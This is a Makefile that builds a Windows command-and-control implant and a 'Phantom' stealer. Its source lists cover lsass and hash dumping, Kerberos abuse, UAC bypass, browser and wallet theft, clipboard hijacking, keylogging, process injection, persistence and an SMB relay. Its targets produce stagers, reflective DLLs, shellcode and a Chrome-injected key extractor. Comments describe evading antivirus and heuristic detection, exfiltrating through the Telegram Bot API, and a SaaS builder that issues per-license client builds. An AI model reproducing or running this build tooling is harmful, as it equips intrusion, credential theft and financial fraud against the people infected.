# ── Toolchain detection — Windows (MSYS2) or Linux (cross-compile) ──────────
# $(OS) and COMSPEC are filtered by the MSYS2 runtime — use wildcard instead.
_ON_WINDOWS := $(wildcard /c/Windows/System32/cmd.exe)
ifneq ($(_ON_WINDOWS),)
  # Windows / MSYS2
  MSYS2   ?= C:/msys64/mingw64
  CC      ?= gcc
  CXX     ?= g++
  STRIP   ?= strip
  OBJCOPY ?= objcopy
  WINDRES ?= windres
  PYTHON  ?= python
  # ld.exe (native PE) calls GetTempPath() — must see a real Windows path in TMP.
  # cygpath -m converts POSIX /tmp → C:/msys64/tmp (forward slashes, writable).
  _WIN_TEMP := $(shell cygpath -m /tmp 2>/dev/null)
  _LD_ENV   := TMP='$(_WIN_TEMP)' TEMP='$(_WIN_TEMP)'
else
  # Linux cross-compile: apt install gcc-mingw-w64-x86-64 mingw-w64
  MSYS2   ?= /usr/x86_64-w64-mingw32
  CC      ?= x86_64-w64-mingw32-gcc
  CXX     ?= x86_64-w64-mingw32-g++
  STRIP   ?= x86_64-w64-mingw32-strip
  OBJCOPY ?= x86_64-w64-mingw32-objcopy
  WINDRES ?= x86_64-w64-mingw32-windres
  PYTHON  ?= python3
endif

# Guard: must run make from the agent/ directory (include/bof.h must be reachable)
ifeq ($(wildcard include/bof.h),)
  $(error Run make from the agent/ directory, not from: $(CURDIR))
endif

BUILDDIR = .

# -DCURL_STATICLIB removed: curl linked dynamically (libcurl-4.dll)
JITTER_PCT ?= 40
# -fno-ident         : supprime la string "GCC: (x86_64-posix-seh...)" dans .comment
# -fno-asynchronous-unwind-tables : supprime .eh_frame (réduit surface heuristique)
# -fno-exceptions    : pas d'exception C++ → pas de .pdata/.xdata MSVC-style
# -Wl,--no-insert-timestamp : ld n'écrit pas de timestamp (pe_scrub en met un aléatoire)
CFLAGS  = -O2 -Wall -Wextra -DNDEBUG -DWIN32_LEAN_AND_MEAN \
          -fno-ident -fno-asynchronous-unwind-tables -fno-exceptions \
          -fno-stack-protector \
          -DJITTER_PCT=$(JITTER_PCT)

# Mixed linking: -mwindows suppresses console
# curl = dynamic (DLL), mbedTLS = static, stdlib = static
LDFLAGS = -mwindows -static-libgcc -static-libstdc++ -Wl,--no-insert-timestamp

INCLUDE = -Iinclude \
          -I$(MSYS2)/include

LIBPATH = -L$(MSYS2)/lib

# mbedTLS static, curl dynamic (avoids HTTP/3 static dep chain)
LIBS    = -Wl,-Bstatic   -lmbedcrypto -lbcrypt \
          -Wl,-Bdynamic  -lcurl \
          -Wl,-Bstatic   -lws2_32 -lwinhttp -lnetapi32 -ladvapi32 \
                         -lwldap32 -lcrypt32 -lsecur32 -liphlpapi \
                         -lgdi32 -lole32 -loleaut32 -luuid

# Standalone: HTTP channel only (WinHTTP loaded at runtime — no IAT entry)
# Excludes teams.c / github.c / doh.c — no libcurl required.
LIBS_SA = -Wl,-Bstatic   -lmbedcrypto -lbcrypt \
          -Wl,-Bstatic   -lws2_32 -lnetapi32 -ladvapi32 \
                         -lwldap32 -lcrypt32 -lsecur32 -liphlpapi \
                         -lgdi32 -lole32 -loleaut32 -luuid

SRC_SA  = src/main.c                 \
          src/beacon.c               \
          src/util.c                 \
          src/adv_lazy.c             \
          src/evs.c                  \
          src/crypto/chacha.c        \
          src/crypto/handshake.c     \
          src/channels/http.c        \
          src/channels/http_only.c   \
          src/commands/shell.c       \
          src/commands/upload.c      \
          src/commands/download.c    \
          src/commands/ps.c          \
          src/commands/getpid.c      \
          src/commands/token.c       \
          src/commands/screenshot.c  \
          src/commands/execasm.c     \
          src/commands/fs.c          \
          src/commands/reg.c         \
          src/commands/lsass.c       \
          src/commands/hashdump.c    \
          src/commands/portscan.c    \
          src/commands/spawn.c       \
          src/commands/wmi.c         \
          src/commands/kerberos.c    \
          src/commands/uac.c         \
          src/commands/getsystem.c   \
          src/commands/lpe_check.c   \
          src/commands/browser.c     \
          src/commands/crypto.c      \
          src/commands/clipjack.c    \
          src/channels/smb.c         \
          src/evasion/evasion.c      \
          src/inject/inject.c        \
          src/inject/spoof_stub.S    \
          src/persist/persist.c      \
          src/bof/bof.c              \
          src/socks/socks.c          \
          src/socks/rportfwd.c

# Lean: no inject/screenshot/lsass/hashdump/kerberos/execasm — minimal capability surface
SRC_LEAN = src/main.c                    \
           src/beacon.c                  \
           src/util.c                    \
           src/adv_lazy.c                \
           src/evs.c                     \
           src/crypto/chacha.c           \
           src/crypto/handshake.c        \
           src/channels/http.c           \
           src/channels/http_only.c      \
           src/commands/shell.c          \
           src/commands/upload.c         \
           src/commands/download.c       \
           src/commands/ps.c             \
           src/commands/getpid.c         \
           src/commands/token.c          \
           src/commands/fs.c             \
           src/commands/reg.c            \
           src/commands/portscan.c       \
           src/commands/spawn.c          \
           src/commands/wmi.c            \
           src/commands/uac.c            \
           src/commands/getsystem.c      \
           src/commands/lpe_check.c      \
           src/commands/browser.c        \
           src/commands/crypto.c         \
           src/commands/clipjack.c       \
           src/channels/smb.c            \
           src/evasion/evasion.c         \
           src/inject/inject_stub.c      \
           src/persist/persist.c         \
           src/bof/bof.c                 \
           src/socks/socks.c             \
           src/socks/rportfwd.c

SRC = src/main.c                 \
      src/beacon.c               \
      src/util.c                 \
      src/adv_lazy.c             \
      src/evs.c                  \
      src/crypto/chacha.c        \
      src/crypto/handshake.c     \
      src/channels/github.c      \
      src/channels/http.c        \
      src/channels/teams.c       \
      src/channels/doh.c         \
      src/commands/shell.c       \
      src/commands/upload.c      \
      src/commands/download.c    \
      src/commands/ps.c          \
      src/commands/getpid.c      \
      src/commands/token.c       \
      src/commands/screenshot.c  \
      src/commands/execasm.c     \
      src/commands/fs.c          \
      src/commands/reg.c         \
      src/commands/lsass.c       \
      src/commands/hashdump.c    \
      src/commands/portscan.c    \
      src/commands/spawn.c       \
      src/commands/wmi.c         \
      src/commands/kerberos.c    \
      src/commands/uac.c         \
      src/commands/getsystem.c   \
      src/commands/lpe_check.c   \
      src/commands/browser.c     \
      src/commands/crypto.c      \
      src/commands/clipjack.c    \
      src/channels/smb.c         \
      src/evasion/evasion.c      \
      src/inject/inject.c        \
      src/inject/spoof_stub.S    \
      src/persist/persist.c      \
      src/bof/bof.c              \
      src/socks/socks.c          \
      src/socks/rportfwd.c

TARGET  = $(BUILDDIR)/agent.exe
RES_SRC = res/agent.rc
RES_OBJ = $(BUILDDIR)/agent_res.o

# DLLs to ship alongside agent.exe (copy from MSYS2 after build)
DLLS   = $(MSYS2)/bin/libcurl-4.dll \
         $(MSYS2)/bin/libssl-3.dll  \
         $(MSYS2)/bin/libcrypto-3.dll

LIFTER_SRC  = src/lifter/lifter.c \
              src/evs.c

LIFTER_LIBS = -Wl,-Bstatic -ladvapi32 -lshell32 -luser32 -lkernel32 \
                            -lole32 -luuid

STAGER_SRC = src/stager/stager.c \
             src/stager/hollow.c \
             src/crypto/chacha.c \
             src/evs.c

STAGER_LIBS = -Wl,-Bstatic -lmbedcrypto -lbcrypt \
              -Wl,-Bstatic -lws2_32 -lwinhttp -ladvapi32 \
                           -lwldap32 -lcrypt32 -lsecur32 \
                           -lgdi32 -lole32 -loleaut32 -luuid

$(RES_OBJ): $(RES_SRC) res/agent.manifest
	$(WINDRES) -i $(RES_SRC) --input-format=rc -o $(RES_OBJ) --output-format=coff

all: config $(RES_OBJ) $(TARGET)

lifter:
	$(CC) -O2 -Wall -Wextra -DNDEBUG -DWIN32_LEAN_AND_MEAN \
	    $(INCLUDE) $(LIFTER_SRC) \
	    $(LIBPATH) $(LIFTER_LIBS) \
	    -mwindows -static-libgcc \
	    -o lifter.exe
	$(STRIP) --strip-all lifter.exe
	@echo "[ok] lifter.exe"

standalone: config $(RES_OBJ)
	$(CC) $(CFLAGS) -DHTTP_ONLY $(INCLUDE) $(SRC_SA) $(RES_OBJ) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) tools/pe_scrub.py $(TARGET)
	@echo "[ok] standalone built $(TARGET) (no curl DLL)"

stager: stager-config stager-only

stager-config:
	$(PYTHON) tools/gen_stager_config.py --url "$(STAGE_URL)" --key "$(STAGE_KEY)"

# stager-only: compile stager without regenerating stager_config.h
# Used by the payload builder API (config already written by the server).
stager-only:
	$(CC) $(CFLAGS) -DHTTP_ONLY $(INCLUDE) $(STAGER_SRC) $(LIBPATH) $(STAGER_LIBS) $(LDFLAGS) -o stager.exe
	@echo "[ok] stager.exe"

# shellcode-only: convert agent.exe → agent.bin via donut
# Requires: pip install donut-shellcode
# Note: run build-only first to produce agent.exe
shellcode-only:
	$(PYTHON) tools/pe2sc.py $(BUILDDIR)/agent.exe $(BUILDDIR)/agent.bin
	@echo "[ok] shellcode agent.bin"

# reflective-dll-only: build agent as a reflective DLL (no console, no WinMain).
# The DLL exports "ReflectiveLoader" — any injector can find it by EAT and call
# it to self-load the agent into memory without LoadLibrary.
#   -shared / -Wl,--dll   : produce a PE DLL
#   -D_REFLECTIVE_DLL     : switches main.c to agent_main() + includes dllmain.c/reflect.c
#   -Wl,--export-all-symbols omitted: only ReflectiveLoader needs export (in reflect.c)
reflective-dll-only:
	$(CC) $(CFLAGS) -D_REFLECTIVE_DLL -DHTTP_ONLY -shared \
	    $(INCLUDE) \
	    $(SRC_SA) \
	    src/reflect/reflect.c \
	    src/reflect/dllmain.c \
	    $(LIBPATH) $(LIBS_SA) \
	    -static-libgcc -static-libstdc++ \
	    -Wl,--dll \
	    -o $(BUILDDIR)/agent.dll
	@echo "[ok] agent.dll (reflective)"

# lean: reduced surface — no inject/screenshot/lsass/hashdump/kerberos/execasm
lean: config $(RES_OBJ)
	$(CC) $(CFLAGS) -DHTTP_ONLY -DLEAN $(INCLUDE) $(SRC_LEAN) $(RES_OBJ) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) tools/pe_scrub.py $(TARGET)
	@echo "[ok] lean build $(TARGET)"

# build-only: compile standalone without regenerating agent_config.h
# Used by the payload builder API (config already written by the server).
build-only: $(RES_OBJ)
	$(CC) $(CFLAGS) -DHTTP_ONLY $(INCLUDE) $(SRC_SA) $(RES_OBJ) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) tools/pe_scrub.py $(TARGET)
	@echo "[ok] build-only $(TARGET)"

config:
	$(PYTHON) tools/obfuscate.py
	$(PYTHON) tools/gen_evs_strings.py
	$(PYTHON) tools/encrypt_blob.py

$(TARGET): $(SRC) $(RES_OBJ) include/agent_config.h
	$(CC) $(CFLAGS) $(INCLUDE) $(SRC) $(RES_OBJ) $(LIBPATH) $(LIBS) $(LDFLAGS) -o $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	@echo "[ok] built $(TARGET)"

# Copy required DLLs next to the binary
bundle: $(TARGET)
	@for dll in $(DLLS); do \
	    cp -v "$$dll" . 2>/dev/null || true; \
	done

strip: $(TARGET)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	@echo "[ok] stripped"

# chrome-helper: build helper DLL injected into chrome.exe for v20 key extraction
# Requires xxd (from MSYS2: pacman -S vim) to generate the blob header.
chrome-helper:
	$(CC) -O2 -shared -DNDEBUG -DWIN32_LEAN_AND_MEAN \
	    $(INCLUDE) src/helpers/chrome_key_helper.c \
	              src/helpers/ckh_reflect.c \
	    -Wl,-Bstatic -lbcrypt -lkernel32 -static-libgcc \
	    -o $(BUILDDIR)/chrome_key_helper.dll
	$(PYTHON) tools/bin2h.py --xor 3BA7C15E --nibble $(BUILDDIR)/chrome_key_helper.dll chrome_key_helper_dll > include/chrome_key_helper_blob.h
	$(PYTHON) tools/encrypt_blob.py
	@echo "[ok] chrome_key_helper.dll + include/chrome_key_helper_blob.h (EVS_KEY encrypted)"

relay:
	$(CC) -O2 -Wall -DNDEBUG -DWIN32_LEAN_AND_MEAN \
	    $(INCLUDE) src/relay/smb_relay.c \
	    $(LIBPATH) \
	    -Wl,-Bstatic -lws2_32 -lwinhttp -ladvapi32 \
	                 -lwldap32 -lcrypt32 -lsecur32 \
	                 -lgdi32 -lole32 -loleaut32 -luuid \
	    -static-libgcc \
	    -o smb_relay.exe
	@echo "[ok] smb_relay.exe"

debug:
	$(CC) $(CFLAGS) -DHTTP_ONLY -DBEACON_INTERVAL=3000 -DJITTER_PCT=0 -DSKIP_EVASION \
	    $(INCLUDE) $(SRC_SA) $(LIBPATH) $(LIBS_SA) $(LDFLAGS) -o $(BUILDDIR)/agent_debug.exe
	$(STRIP) --strip-all $(BUILDDIR)/agent_debug.exe
	@echo "[ok] agent_debug.exe (interval=3s, no jitter, stripped)"

clean:
ifeq ($(OS),Windows_NT)
	del /Q "$(BUILDDIR)\agent.exe" "$(BUILDDIR)\agent_res.o" 2>nul || true
else
	rm -f $(BUILDDIR)/agent.exe $(BUILDDIR)/agent_res.o
endif

# ── Phantom stealer ─────────────────────────────────────────────────────────
# Standalone, no C2 / beacon loop. Exfils via Telegram Bot API.
# Usage: make phantom TG_TOKEN="bot:TOKEN" TG_CHAT="-100CHATID"
#
# Two-pass: C files with $(CC), C++ files with $(CXX), link with $(CXX).

# Output dir outside OneDrive so AV/OneDrive can't quarantine the binary
PHANTOM_OUT ?= C:/Dev/phantom_build

PHANTOM_CF  = $(CFLAGS) -pipe $(INCLUDE)
PHANTOM_CXF = -O2 -Wall -DNDEBUG -pipe \
              -fno-ident -fno-stack-protector -std=c++17 \
              -Ikeylogger $(INCLUDE)

# All feature flags — full capability for normal phantom builds.
# Builder overrides PHANTOM_FEAT_FLAGS to select features per-client.
PHANTOM_ALL_FEATURES = -DHAVE_KEYLOGGER -DHAVE_CLIPJACK -DHAVE_SCREENSHOT \
                       -DHAVE_BROWSER   -DHAVE_CRYPTO   -DHAVE_DISCORD    \
                       -DHAVE_CLIPBOARD -DHAVE_SHELL
PHANTOM_FEAT_FLAGS  ?= $(PHANTOM_ALL_FEATURES)
PHANTOM_WATERMARK   ?=

LIBS_PHANTOM = -Wl,-Bstatic -lmbedcrypto -lbcrypt \
               -Wl,-Bstatic -lws2_32 -lwinhttp -ladvapi32 \
                            -lwldap32 -lcrypt32 -lsecur32 \
                            -lgdi32 -lole32 -loleaut32 -luuid \
               -Wl,-Bstatic -lwinpthread \
               -static-libstdc++ -static-libgcc

phantom-c2: config
	$(CC)  $(PHANTOM_CF)  $(PHANTOM_ALL_FEATURES) -c src/phantom_main.c -o ph_main.o
	$(CC)  $(PHANTOM_CF)  -c src/c2_client.c                 -o ph_c2.o
	$(CC)  $(PHANTOM_CF)  -c src/evs.c                       -o ph_evs.o
	$(CC)  $(PHANTOM_CF)  -c src/adv_lazy.c                  -o ph_adv_lazy.o
	$(CC)  $(PHANTOM_CF)  -c src/crypto/chacha.c             -o ph_chacha.o
	$(CC)  $(PHANTOM_CF)  -c src/evasion/evasion.c           -o ph_evasion.o
	$(CC)  $(PHANTOM_CF)  -c src/inject/spoof_stub.S         -o ph_spoof.o
	$(CC)  $(PHANTOM_CF)  -c src/inject/inject.c             -o ph_inject.o
	$(CC)  $(PHANTOM_CF)  -DHAVE_CHROME_INJECT -c src/commands/browser.c -o ph_browser.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/crypto.c           -o ph_crypto.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/screenshot.c       -o ph_screenshot.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/clipjack.c         -o ph_clipjack.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/clipboard.c        -o ph_clipboard.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/shell.c            -o ph_shell.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/ps.c               -o ph_ps.o
	$(CC)  $(PHANTOM_CF)  -c src/helpers/chrome_key_helper.c -o ph_chrome.o
	$(CXX) $(PHANTOM_CXF) -c src/keylogger_wrap.cpp          -o ph_kl_wrap.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/IndirectSyscalls.cpp  -o ph_isys.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/APIHashing.cpp        -o ph_apih.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/dosyscall.S           -o ph_dosc.o
	$(PYTHON) -c "import os; os.makedirs(r'$(PHANTOM_OUT)', exist_ok=True)"
	$(_LD_ENV) $(CXX) -o $(PHANTOM_OUT)/phantom.exe \
	    ph_main.o ph_c2.o ph_evs.o ph_adv_lazy.o \
	    ph_chacha.o ph_evasion.o ph_spoof.o ph_inject.o \
	    ph_browser.o ph_crypto.o ph_screenshot.o \
	    ph_clipjack.o ph_clipboard.o ph_shell.o ph_ps.o ph_chrome.o \
	    ph_kl_wrap.o ph_isys.o ph_apih.o ph_dosc.o \
	    $(LIBPATH) $(LIBS_PHANTOM) $(LDFLAGS)
	-del /Q ph_*.o 2>nul
	$(STRIP) --strip-all $(PHANTOM_OUT)/phantom.exe
	$(OBJCOPY) --strip-debug $(PHANTOM_OUT)/phantom.exe
	$(PYTHON) tools/pe_scrub.py $(PHANTOM_OUT)/phantom.exe
	@echo "[ok] $(PHANTOM_OUT)/phantom.exe (C2 mode)"

phantom-c2-dbg: config
	$(CC)  $(PHANTOM_CF)  $(PHANTOM_ALL_FEATURES) -DPHANTOM_DEBUG -DSKIP_EVASION -c src/phantom_main.c -o ph_main.o
	$(CC)  $(PHANTOM_CF)  -DPHANTOM_DEBUG -c src/c2_client.c                 -o ph_c2.o
	$(CC)  $(PHANTOM_CF)  -c src/evs.c                       -o ph_evs.o
	$(CC)  $(PHANTOM_CF)  -c src/adv_lazy.c                  -o ph_adv_lazy.o
	$(CC)  $(PHANTOM_CF)  -c src/crypto/chacha.c             -o ph_chacha.o
	$(CC)  $(PHANTOM_CF)  -c src/evasion/evasion.c           -o ph_evasion.o
	$(CC)  $(PHANTOM_CF)  -c src/inject/spoof_stub.S         -o ph_spoof.o
	$(CC)  $(PHANTOM_CF)  -c src/inject/inject.c             -o ph_inject.o
	$(CC)  $(PHANTOM_CF)  -DHAVE_CHROME_INJECT -c src/commands/browser.c -o ph_browser.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/crypto.c           -o ph_crypto.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/screenshot.c       -o ph_screenshot.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/clipjack.c         -o ph_clipjack.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/clipboard.c        -o ph_clipboard.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/shell.c            -o ph_shell.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/ps.c               -o ph_ps.o
	$(CC)  $(PHANTOM_CF)  -c src/helpers/chrome_key_helper.c -o ph_chrome.o
	$(CC)  $(PHANTOM_CF)  -c src/no_md5.c                   -o ph_no_md5.o
	$(CC)  $(PHANTOM_CF)  -c src/no_sha1.c                  -o ph_no_sha1.o
	$(CC)  $(PHANTOM_CF)  -c src/no_sha256.c                -o ph_no_sha256.o
	$(CC)  $(PHANTOM_CF)  -c src/no_sha512.c                -o ph_no_sha512.o
	$(CC)  $(PHANTOM_CF)  -c src/no_aes.c                   -o ph_no_aes.o
	$(CC)  $(PHANTOM_CF)  -c src/no_ripemd160.c             -o ph_no_ripemd160.o
	$(CC)  $(PHANTOM_CF)  -c src/no_aria.c                  -o ph_no_aria.o
	$(CC)  $(PHANTOM_CF)  -c src/no_chacha20.c              -o ph_no_chacha20.o
	$(WINDRES) -i res/phantom.rc --input-format=rc -o ph_res.o --output-format=coff
	$(CXX) $(PHANTOM_CXF) -DPHANTOM_DEBUG -c src/keylogger_wrap.cpp          -o ph_kl_wrap.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/IndirectSyscalls.cpp  -o ph_isys.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/APIHashing.cpp        -o ph_apih.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/dosyscall.S           -o ph_dosc.o
	$(_LD_ENV) $(CXX) -o phantom_c2_dbg.exe \
	    ph_main.o ph_c2.o ph_evs.o ph_adv_lazy.o \
	    ph_chacha.o ph_evasion.o ph_spoof.o ph_inject.o \
	    ph_browser.o ph_crypto.o ph_screenshot.o \
	    ph_clipjack.o ph_clipboard.o ph_shell.o ph_ps.o ph_chrome.o \
	    ph_kl_wrap.o ph_isys.o ph_apih.o ph_dosc.o ph_res.o \
	    ph_no_md5.o ph_no_sha1.o ph_no_sha256.o ph_no_sha512.o ph_no_aes.o \
	    ph_no_ripemd160.o ph_no_aria.o ph_no_chacha20.o \
	    $(LIBPATH) $(LIBS_PHANTOM) -mconsole -static-libstdc++ -static-libgcc -Wl,--no-insert-timestamp
ifeq ($(OS),Windows_NT)
	del /Q ph_*.o 2>nul || true
else
	rm -f ph_*.o
endif
	@echo "[ok] phantom_c2_dbg.exe (C2 mode, debug console)"

# phantom-c2-build-only — used by the SaaS builder API.
# Config (str_enc.h / phantom_config.h) must be pre-written by the server.
# PHANTOM_FEAT_FLAGS: subset of PHANTOM_ALL_FEATURES for this client build.
# PHANTOM_WATERMARK:  -DBUILD_UUID=\"...\" embedded per-license.
phantom-c2-build-only:
	$(CC)  $(PHANTOM_CF)  $(PHANTOM_FEAT_FLAGS) $(PHANTOM_WATERMARK) \
	    $(if $(PHANTOM_CLIPJACK_ADDRS),-DCLIPJACK_AUTOADDR=\"$(PHANTOM_CLIPJACK_ADDRS)\",) \
	    -c src/phantom_main.c              -o ph_main.o
	$(CC)  $(PHANTOM_CF)  -c src/c2_client.c                 -o ph_c2.o
	$(CC)  $(PHANTOM_CF)  -c src/evs.c                       -o ph_evs.o
	$(CC)  $(PHANTOM_CF)  -c src/adv_lazy.c                  -o ph_adv_lazy.o
	$(CC)  $(PHANTOM_CF)  -c src/crypto/chacha.c             -o ph_chacha.o
	$(CC)  $(PHANTOM_CF)  -c src/evasion/evasion.c           -o ph_evasion.o
	$(CC)  $(PHANTOM_CF)  -c src/inject/spoof_stub.S         -o ph_spoof.o
	$(CC)  $(PHANTOM_CF)  -c src/inject/inject.c             -o ph_inject.o
	$(CC)  $(PHANTOM_CF)  -DHAVE_CHROME_INJECT -c src/commands/browser.c -o ph_browser.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/crypto.c           -o ph_crypto.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/screenshot.c       -o ph_screenshot.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/clipjack.c         -o ph_clipjack.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/clipboard.c        -o ph_clipboard.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/shell.c            -o ph_shell.o
	$(CC)  $(PHANTOM_CF)  -c src/commands/ps.c               -o ph_ps.o
	$(CC)  $(PHANTOM_CF)  -c src/helpers/chrome_key_helper.c -o ph_chrome.o
	$(CC)  $(PHANTOM_CF)  -c src/wrap_ipfp.c                 -o ph_wrap_ipfp.o
	$(CC)  $(PHANTOM_CF)  -c src/wrap_k32.c                  -o ph_wrap_k32.o
	$(CC)  $(PHANTOM_CF)  -c src/no_md5.c                    -o ph_no_md5.o
	$(CC)  $(PHANTOM_CF)  -c src/no_sha1.c                   -o ph_no_sha1.o
	$(CC)  $(PHANTOM_CF)  -c src/no_sha256.c                 -o ph_no_sha256.o
	$(CC)  $(PHANTOM_CF)  -c src/no_sha512.c                 -o ph_no_sha512.o
	$(CC)  $(PHANTOM_CF)  -c src/no_aes.c                    -o ph_no_aes.o
	$(CC)  $(PHANTOM_CF)  -c src/no_ripemd160.c              -o ph_no_ripemd160.o
	$(CC)  $(PHANTOM_CF)  -c src/no_aria.c                   -o ph_no_aria.o
	$(CC)  $(PHANTOM_CF)  -c src/no_chacha20.c               -o ph_no_chacha20.o
	$(WINDRES) -i res/phantom.rc --input-format=rc -o ph_res.o --output-format=coff
	$(CXX) $(PHANTOM_CXF) -c src/keylogger_wrap.cpp          -o ph_kl_wrap.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/IndirectSyscalls.cpp  -o ph_isys.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/APIHashing.cpp        -o ph_apih.o
	$(CXX) $(PHANTOM_CXF) -c keylogger/dosyscall.S           -o ph_dosc.o
	$(PYTHON) -c "import os; os.makedirs(r'$(PHANTOM_OUT)', exist_ok=True)"
	$(_LD_ENV) $(CXX) -o $(PHANTOM_OUT)/phantom.exe \
	    ph_main.o ph_c2.o ph_evs.o ph_adv_lazy.o \
	    ph_chacha.o ph_evasion.o ph_spoof.o ph_inject.o \
	    ph_browser.o ph_crypto.o ph_screenshot.o \
	    ph_clipjack.o ph_clipboard.o ph_shell.o ph_ps.o ph_chrome.o \
	    ph_kl_wrap.o ph_isys.o ph_apih.o ph_dosc.o ph_wrap_ipfp.o ph_wrap_k32.o ph_res.o \
	    ph_no_md5.o ph_no_sha1.o ph_no_sha256.o ph_no_sha512.o ph_no_aes.o \
	    ph_no_ripemd160.o ph_no_aria.o ph_no_chacha20.o \
	    $(LIBPATH) $(LIBS_PHANTOM) $(LDFLAGS) \
	    -Wl,--wrap,IsProcessorFeaturePresent \
	    -Wl,--wrap,BCryptGenRandom \
	    -Wl,--wrap,rand \
	    -Wl,--wrap,srand
	-del /Q ph_*.o 2>nul
	$(STRIP) --strip-all $(PHANTOM_OUT)/phantom.exe
	$(OBJCOPY) --strip-debug $(PHANTOM_OUT)/phantom.exe
	$(PYTHON) tools/pe_scrub.py $(PHANTOM_OUT)/phantom.exe
	@echo "[ok] $(PHANTOM_OUT)/phantom.exe (build-only)"

.PHONY: all standalone lean build-only debug stager stager-config stager-only shellcode-only reflective-dll-only bundle strip relay chrome-helper phantom-c2 phantom-c2-dbg phantom-c2-build-only clean
